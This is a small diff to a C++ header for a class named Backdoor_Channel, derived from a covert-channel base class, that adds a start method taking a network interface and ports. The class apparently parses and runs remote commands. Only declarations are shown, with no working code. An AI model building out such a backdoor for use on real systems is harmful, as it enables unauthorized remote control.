@@ -11,13 +11,14 @@ class Backdoor_Channel : public Covert_Channel
 {
 public:
 
-
+    void start(string interface, int listen_port, int target_port);
 
 private:
 
     bool parse_command(Job& j);
     bool handle_run_cmd(Job& j);
     bool handle_ret_cmd(Job& j);
+
 
 };
 
